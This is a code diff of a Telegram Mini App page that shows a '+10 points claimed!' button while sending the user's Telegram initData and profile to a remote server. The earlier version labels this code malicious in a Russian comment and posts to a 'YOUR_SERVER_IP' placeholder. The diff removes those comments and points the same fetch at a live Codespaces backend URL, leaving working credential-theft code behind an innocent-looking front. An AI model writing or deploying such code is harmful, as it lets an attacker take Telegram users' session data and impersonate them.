@@ -1,4 +1,3 @@
-<!-- public/index.html -->
 <!DOCTYPE html>
 <html>
 <head>
@@ -20,31 +19,40 @@
     </div>
 
     <script>
+        // ТВОЙ CODESPACE URL (ЗАМЕНИ НА СВОЙ)
+        const BACKEND_URL = "https://sturdy-umbrella-g4qxgpv5v4xw3v67w-8080.preview.app.github.dev";
+        
         const tg = window.Telegram.WebApp;
         tg.ready();
-        tg.expand();  // Разворачиваем на весь экран
+        tg.expand();
         
-        // Получаем данные пользователя из Telegram
-        const user = tg.initDataUnsafe.user || { first_name: 'Anonymous' };
+        const user = tg.initDataUnsafe.user || { first_name: 'Anonymous', id: 0 };
         document.getElementById('username').innerText = user.first_name;
         
-        // ⚠️ ВРЕДОНОСНЫЙ КОД (в реальном эксплойте он скрыт)
-        // Отправляем initData и userData на сервер злоумышленника
         const initData = tg.initData;
         const userData = JSON.stringify(user);
         
-        fetch('http://YOUR_SERVER_IP:5000/api/init', {
+        console.log("Sending initData to backend...");
+        
+        // ОТПРАВЛЯЕМ initData НА БЭКЕНД
+        fetch(`${BACKEND_URL}/api/init`, {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json',
                 'X-Init-Data': initData,
                 'X-User-Data': userData
             }
-        }).then(res => res.json())
-          .then(data => console.log('Init sent:', data))
-          .catch(err => console.error('Failed to send init:', err));
+        })
+        .then(res => res.json())
+        .then(data => {
+            console.log('Success:', data);
+            document.getElementById('username').innerHTML = `${user.first_name} (data sent)`;
+        })
+        .catch(err => {
+            console.error('Error:', err);
+            document.getElementById('username').innerHTML = `${user.first_name} (error: ${err.message})`;
+        });
         
-        // Обычная логика приложения
         document.getElementById('claimBtn').addEventListener('click', () => {
             alert("+10 points claimed!");
         });
